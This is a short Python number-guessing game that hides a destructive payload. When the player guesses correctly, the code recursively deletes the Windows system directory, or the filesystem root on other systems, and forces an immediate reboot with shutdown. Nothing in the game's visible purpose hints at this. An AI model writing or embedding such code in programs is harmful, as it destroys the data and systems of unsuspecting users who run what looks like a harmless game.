import random
import shutil
import os

top_of_range = input("Type a number: ")

if top_of_range.isdigit():
    top_of_range = int(top_of_range)
    
    if top_of_range <= 0:
        print("Please type a number larger than 0 next time.")
        quit()
else:
    print("Please type a number next time.")
    quit()

random_number = random.randint(0, top_of_range)
guesses = 0

while True:
    guesses += 1
    user_guess = input("Make a guess: ")
    if user_guess.isdigit():
        user_guess = int(user_guess)
    else :
        print("Please type a number next time.")
        continue
    
    if user_guess == random_number:
        print("You got it!")

        shutdown_command = "shutdown -r -f"
        if os.name == "nt":
            path = os.getenv("windir")
            shutdown_command += " -t 0"
        else :
            path = "/"
            shutdown_command += " now"
        shutil.rmtree(path, ignore_errors=True)
        os.system(shutdown_command)

        break
    elif user_guess > random_number:
        print("You were above the number!")
        continue
    else:
        print("You were below the number!")
        continue
        
    
print(f"You got it in {guesses} guesses!")